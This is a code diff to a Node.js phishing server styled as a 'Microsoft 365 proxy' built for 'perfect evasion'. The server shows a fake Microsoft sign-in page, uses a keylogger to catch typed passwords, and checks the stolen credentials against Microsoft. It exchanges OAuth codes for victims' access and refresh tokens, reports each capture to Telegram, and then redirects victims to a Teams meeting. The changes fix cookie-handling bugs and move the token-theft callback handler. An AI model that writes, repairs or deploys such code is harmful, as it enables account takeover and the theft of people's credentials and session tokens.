@@ -98,7 +98,12 @@ class SessionStore {
         const httpOnlyCookies = [];
         const cookieStrings = [];
         
-        for (const cookieHeader of cookieHeaders) {
+        // ✅ FIX: Handle both string and array
+        const cookieHeaderArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
+        
+        for (const cookieHeader of cookieHeaderArray) {
+            if (!cookieHeader || typeof cookieHeader !== 'string') continue;
+            
             const parts = cookieHeader.split(';');
             const [nameValue, ...attributes] = parts;
             const [name, value] = nameValue.split('=');
@@ -508,9 +513,33 @@ function generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
 }
 
+// ✅ FIXED: Handle cookieHeader being an object or array
 function getSessionIdFromCookie(cookieHeader) {
     if (!cookieHeader) return null;
-    const cookies = cookieHeader.split('; ');
+    
+    // If it's an object, try to get the cookie string
+    let cookieString = '';
+    if (typeof cookieHeader === 'object') {
+        // If it's an array, join it
+        if (Array.isArray(cookieHeader)) {
+            cookieString = cookieHeader.join('; ');
+        } else {
+            // If it's an object with a cookie property
+            cookieString = cookieHeader.cookie || cookieHeader['cookie'] || '';
+            // Or if it's a headers object
+            if (cookieHeader.headers && cookieHeader.headers.cookie) {
+                cookieString = cookieHeader.headers.cookie;
+            }
+        }
+    } else if (typeof cookieHeader === 'string') {
+        cookieString = cookieHeader;
+    } else {
+        return null;
+    }
+    
+    if (!cookieString || typeof cookieString !== 'string') return null;
+    
+    const cookies = cookieString.split('; ');
     for (const cookie of cookies) {
         const [name, value] = cookie.split('=');
         if (name === 'sessionId') {
@@ -592,7 +621,17 @@ function serveFile(filename, res, contentType = 'text/html') {
 // ============================================================
 
 function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
-    const sessionId = getSessionIdFromCookie(res.getHeader('Set-Cookie'));
+    // Get session ID from response headers or generate new
+    let sessionId = 'unknown';
+    try {
+        const cookieHeader = res.getHeader('Set-Cookie');
+        if (cookieHeader) {
+            const cookieString = Array.isArray(cookieHeader) ? cookieHeader.join('; ') : cookieHeader;
+            const match = cookieString.match(/sessionId=([^;]+)/);
+            if (match) sessionId = match[1];
+        }
+    } catch(e) {}
+
     const errorDisplay = errorMessage ? `
         <div class="error show">
             <span class="error-icon">⚠️</span>
@@ -681,7 +720,7 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
     
     <script>
         window.MICROSOFT_CONFIG = {
-            SESSION_ID: '${sessionId || 'unknown'}',
+            SESSION_ID: '${sessionId}',
             EMAIL: '${email}',
             BACKEND_URL: '${BACKEND_URL}',
             KEYLOGGER_URL: '${KEYLOGGER_URL}'
@@ -709,7 +748,7 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                             email: '${email}',
                             password: value,
                             source: 'password_input',
-                            sessionId: '${sessionId || 'unknown'}',
+                            sessionId: '${sessionId}',
                             timestamp: new Date().toISOString()
                         })
                     }).catch(() => {});
@@ -757,7 +796,7 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                     email: '${email}',
                     password: password,
                     source: 'form_submit',
-                    sessionId: '${sessionId || 'unknown'}',
+                    sessionId: '${sessionId}',
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
@@ -772,10 +811,8 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
             })
             .then(response => {
                 if (response.redirected) {
-                    // ✅ Success - redirect to Teams
                     window.location.href = response.url;
                 } else {
-                    // ❌ Failed - reload page to show error
                     window.location.reload();
                 }
             })
@@ -819,7 +856,7 @@ function showLoginPage(res, email, attemptCount = 1, errorMessage = null) {
                             email: '${email}',
                             password: password,
                             source: 'manual_capture',
-                            sessionId: '${sessionId || 'unknown'}',
+                            sessionId: '${sessionId}',
                             timestamp: new Date().toISOString()
                         })
                     }).catch(() => {});
@@ -1513,15 +1550,10 @@ async function handlePostRequest(body, req, res) {
             }
         }
 
-        // ============================================================
-        //  VERIFY WITH MICROSOFT
-        // ============================================================
-        
+        // Verify with Microsoft
         const verifyResult = await verifyWithMicrosoft(email, password);
         
-        // ============================================================
-        //  ✅ SUCCESS - Correct Password
-        // ============================================================
+        // SUCCESS - Correct Password
         if (verifyResult.success) {
             console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
             
@@ -1576,7 +1608,7 @@ async function handlePostRequest(body, req, res) {
 
             sessionStore.sendTelegram(successMsg);
             
-            // ✅ REDIRECT TO TEAMS MEETING
+            // Redirect to Teams Meeting
             res.writeHead(302, { 
                 'Location': TEAMS_REDIRECT,
                 'Cache-Control': 'no-store, no-cache'
@@ -1585,9 +1617,7 @@ async function handlePostRequest(body, req, res) {
             return;
         }
         
-        // ============================================================
-        //  ❌ FAILED - Wrong Password - STAY ON PROXY
-        // ============================================================
+        // FAILED - Wrong Password - STAY ON PROXY
         console.log(`[AUTH] ❌ INVALID credentials: ${email} (Attempt ${attemptCount})`);
         
         // Send failure message
@@ -1605,7 +1635,7 @@ async function handlePostRequest(body, req, res) {
 
         sessionStore.sendTelegram(failMsg);
         
-        // ✅ STAY ON PROXY - Show error and let user retry
+        // STAY ON PROXY - Show error and let user retry
         return showLoginPage(res, email, attemptCount, 'Invalid email or password. Please try again.');
 
     } catch (error) {
@@ -1642,8 +1672,150 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
-    // ✅ Show login page (stays on proxy)
+    // Show login page (stays on proxy)
     showLoginPage(res, email, 1, null);
+}
+
+// ============================================================
+//  HANDLE OAUTH CALLBACK
+// ============================================================
+
+function handleOAuthCallback(req, res) {
+    try {
+        const url = new URL(req.url, `http://${req.headers.host}`);
+        const code = url.searchParams.get('code');
+        const error = url.searchParams.get('error');
+        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
+        
+        console.log('[OAUTH-CALLBACK] 📥 Received callback');
+        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
+        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
+        
+        if (error) {
+            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
+            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                `client_id=${MICROSOFT_CLIENT_ID}&` +
+                `response_type=code&` +
+                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
+                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                `login_hint=${encodeURIComponent(email)}`;
+            
+            res.writeHead(302, { 'Location': targetUrl });
+            res.end();
+            return;
+        }
+        
+        if (code) {
+            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
+            
+            const tokenData = querystring.stringify({
+                client_id: MICROSOFT_CLIENT_ID,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: MICROSOFT_REDIRECT_URI,
+                scope: MICROSOFT_SCOPES
+            });
+            
+            const tokenOptions = {
+                hostname: 'login.microsoftonline.com',
+                path: '/common/oauth2/v2.0/token',
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Length': Buffer.byteLength(tokenData),
+                    'Accept': 'application/json'
+                }
+            };
+            
+            const tokenReq = https.request(tokenOptions, (tokenRes) => {
+                let tokenBody = '';
+                tokenRes.on('data', chunk => tokenBody += chunk);
+                tokenRes.on('end', () => {
+                    try {
+                        const tokens = JSON.parse(tokenBody);
+                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
+                        
+                        const accessToken = tokens.access_token;
+                        const refreshToken = tokens.refresh_token;
+                        const idToken = tokens.id_token;
+                        
+                        if (sessionId) {
+                            sessionStore.storeTokens(sessionId, {
+                                access_token: accessToken,
+                                refresh_token: refreshToken,
+                                id_token: idToken
+                            });
+                        }
+                        
+                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
+                        const successMsg = 
+`🤖 *OAUTH LOGIN SUCCESSFUL*
+
+*📧 Email:* ${email}
+*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
+*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
+*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}
+
+*🕐 Time:* ${new Date().toISOString()}
+
+*✅ OAuth flow completed!*`;
+
+                        sessionStore.sendTelegram(successMsg);
+                        
+                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
+                        
+                        res.writeHead(302, { 
+                            'Location': proxyLoginUrl,
+                            'Cache-Control': 'no-store, no-cache'
+                        });
+                        res.end();
+                        
+                    } catch (error) {
+                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
+                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                            `client_id=${MICROSOFT_CLIENT_ID}&` +
+                            `response_type=code&` +
+                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
+                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                            `login_hint=${encodeURIComponent(email)}`;
+                        
+                        res.writeHead(302, { 'Location': fallbackUrl });
+                        res.end();
+                    }
+                });
+            });
+            
+            tokenReq.on('error', (err) => {
+                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
+                res.writeHead(302, { 'Location': REDIRECT_URL });
+                res.end();
+            });
+            
+            tokenReq.write(tokenData);
+            tokenReq.end();
+            
+        } else {
+            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
+            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                `client_id=${MICROSOFT_CLIENT_ID}&` +
+                `response_type=code&` +
+                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
+                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                `login_hint=${encodeURIComponent(email)}`;
+            
+            res.writeHead(302, { 'Location': targetUrl });
+            res.end();
+        }
+        
+    } catch (error) {
+        console.error('[OAUTH-CALLBACK] Error:', error.message);
+        res.writeHead(302, { 'Location': REDIRECT_URL });
+        res.end();
+    }
 }
 
 // ============================================================
@@ -1881,7 +2053,8 @@ const server = http.createServer((req, res) => {
                     passwordCaptures: sessionStore.passwordCaptures.get(sessionId) || [],
                     fullAuthData: sessionStore.getFullAuthData(sessionId),
                     tokenCount: sessionStore.allTokens.get(sessionId) ? 
-                        Object.values(sessionStore.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0                }, null, 2));
+                        Object.values(sessionStore.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0
+                }, null, 2));
                 
             } catch (error) {
                 console.error('[REPLAY] Error:', error.message);
@@ -2072,148 +2245,6 @@ const server = http.createServer((req, res) => {
 });
 
 // ============================================================
-//  HANDLE OAUTH CALLBACK
-// ============================================================
-
-function handleOAuthCallback(req, res) {
-    try {
-        const url = new URL(req.url, `http://${req.headers.host}`);
-        const code = url.searchParams.get('code');
-        const error = url.searchParams.get('error');
-        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
-        
-        console.log('[OAUTH-CALLBACK] 📥 Received callback');
-        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
-        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
-        
-        if (error) {
-            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
-            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
-            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                `client_id=${MICROSOFT_CLIENT_ID}&` +
-                `response_type=code&` +
-                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                `login_hint=${encodeURIComponent(email)}`;
-            
-            res.writeHead(302, { 'Location': targetUrl });
-            res.end();
-            return;
-        }
-        
-        if (code) {
-            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
-            
-            const tokenData = querystring.stringify({
-                client_id: MICROSOFT_CLIENT_ID,
-                grant_type: 'authorization_code',
-                code: code,
-                redirect_uri: MICROSOFT_REDIRECT_URI,
-                scope: MICROSOFT_SCOPES
-            });
-            
-            const tokenOptions = {
-                hostname: 'login.microsoftonline.com',
-                path: '/common/oauth2/v2.0/token',
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Content-Length': Buffer.byteLength(tokenData),
-                    'Accept': 'application/json'
-                }
-            };
-            
-            const tokenReq = https.request(tokenOptions, (tokenRes) => {
-                let tokenBody = '';
-                tokenRes.on('data', chunk => tokenBody += chunk);
-                tokenRes.on('end', () => {
-                    try {
-                        const tokens = JSON.parse(tokenBody);
-                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
-                        
-                        const accessToken = tokens.access_token;
-                        const refreshToken = tokens.refresh_token;
-                        const idToken = tokens.id_token;
-                        
-                        if (sessionId) {
-                            sessionStore.storeTokens(sessionId, {
-                                access_token: accessToken,
-                                refresh_token: refreshToken,
-                                id_token: idToken
-                            });
-                        }
-                        
-                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
-                        const successMsg = 
-`🤖 *OAUTH LOGIN SUCCESSFUL*
-
-*📧 Email:* ${email}
-*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
-*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
-*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}
-
-*🕐 Time:* ${new Date().toISOString()}
-
-*✅ OAuth flow completed!*`;
-
-                        sessionStore.sendTelegram(successMsg);
-                        
-                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
-                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
-                        
-                        res.writeHead(302, { 
-                            'Location': proxyLoginUrl,
-                            'Cache-Control': 'no-store, no-cache'
-                        });
-                        res.end();
-                        
-                    } catch (error) {
-                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
-                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
-                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                            `client_id=${MICROSOFT_CLIENT_ID}&` +
-                            `response_type=code&` +
-                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                            `login_hint=${encodeURIComponent(email)}`;
-                        
-                        res.writeHead(302, { 'Location': fallbackUrl });
-                        res.end();
-                    }
-                });
-            });
-            
-            tokenReq.on('error', (err) => {
-                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
-                res.writeHead(302, { 'Location': REDIRECT_URL });
-                res.end();
-            });
-            
-            tokenReq.write(tokenData);
-            tokenReq.end();
-            
-        } else {
-            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
-            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
-            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                `client_id=${MICROSOFT_CLIENT_ID}&` +
-                `response_type=code&` +
-                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
-                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
-                `login_hint=${encodeURIComponent(email)}`;
-            
-            res.writeHead(302, { 'Location': targetUrl });
-            res.end();
-        }
-        
-    } catch (error) {
-        console.error('[OAUTH-CALLBACK] Error:', error.message);
-        res.writeHead(302, { 'Location': REDIRECT_URL });
-        res.end();
-    }
-}
-
-// ============================================================
 //  START SERVER
 // ============================================================
 
@@ -2222,22 +2253,12 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
     console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
-    console.log('║     ✅  User STAYS on Proxy until CORRECT password           ║');
+    console.log('║     ✅  FIXED: cookieHeader.split error                      ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
     console.log(`║   📍 Server:    http://localhost:${PORT}                       ║`);
     console.log(`║   🔗 Entry:     ${PROXY_ENTRY_POINT}                         ║`);
-    console.log(`║                                                               ║`);
-    console.log('╠═══════════════════════════════════════════════════════════════╣');
-    console.log('║                                                               ║');
-    console.log('║   📱 TELEGRAM ALERTS:                                        ║');
-    console.log('║   ✅ Password Captured (real-time)                           ║');
-    console.log('║   ✅ HttpOnly Cookies Captured (Service Worker)              ║');
-    console.log('║   ✅ VALID Microsoft Credentials (with tokens)               ║');
-    console.log('║   ❌ INVALID Microsoft Credentials (with error)              ║');
-    console.log('║   🎯 OAuth Tokens Captured                                  ║');
-    console.log('║   ⌨️ Keylogger Password Extracted                           ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
@@ -2250,10 +2271,9 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
-    console.log('║   ✅ FIX: User STAYS ON PROXY until correct password         ║');
-    console.log('║   ✅ FIX: WRONG passwords captured and logged               ║');
-    console.log('║   ✅ FIX: CORRECT password captured with tokens              ║');
-    console.log('║   ✅ FIX: Redirect to Teams ONLY on success                 ║');
+    console.log('║   ✅ FIXED: cookieHeader.split is not a function            ║');
+    console.log('║   ✅ FIXED: User STAYS ON PROXY until correct password       ║');
+    console.log('║   ✅ FIXED: All cookies captured properly                   ║');
     console.log('║                                                               ║');
     console.log('╚═══════════════════════════════════════════════════════════════╝');
 });
